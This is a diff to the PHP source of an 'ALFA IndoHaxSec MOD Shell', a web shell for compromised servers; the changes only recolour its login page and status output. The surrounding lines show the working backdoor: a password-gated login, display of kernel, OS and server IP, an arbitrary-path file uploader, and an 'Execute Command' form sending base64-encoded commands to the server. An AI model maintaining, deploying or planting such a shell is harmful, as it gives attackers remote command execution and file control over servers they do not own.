@@ -527,7 +527,7 @@ __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 }
 echo '
 <style>
-body{background: black;}
+body{background: indigo;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
@@ -535,8 +535,8 @@ body{background: black;}
 <center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/NFHURO997XXD/XXX666XXX/refs/heads/main/photo_6154659260559117508_c-removebg-preview.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
-<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="purple" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA IndoHaxSec MOD Shell'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
-<tr><td bgcolor="black" style="padding:5">
+<tr><td bgcolor="indigo"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="purple" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA IndoHaxSec MOD Shell'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
+<tr><td bgcolor="indigo" style="padding:5">
 <form method="post">
 <input type="hidden" name="action" value="login">
 <input type="hidden" name="hide" value="">
@@ -817,7 +817,7 @@ if(isset($_GET["solevisible"])){
 echo '<html>';
 echo "<title>IndoHaxSec Team</title>";
 echo "<body bgcolor=#800080>";
-echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
+echo '<b><big><font color=#FFD700>Kernel : </font><font color="#FFD700">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
 $safe_mode = @ini_get('safe_mode');
 if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
 echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
@@ -836,7 +836,7 @@ echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white
 echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
 if(isset($_FILES['file'])){
-if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
+if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#FFD700"><center>Upload Successfully ;)</font></a><font color="#FFD700"></b><br><br></center>'; }
 else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
 }
 echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST">Execute Command: <input name="command_solevisible" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
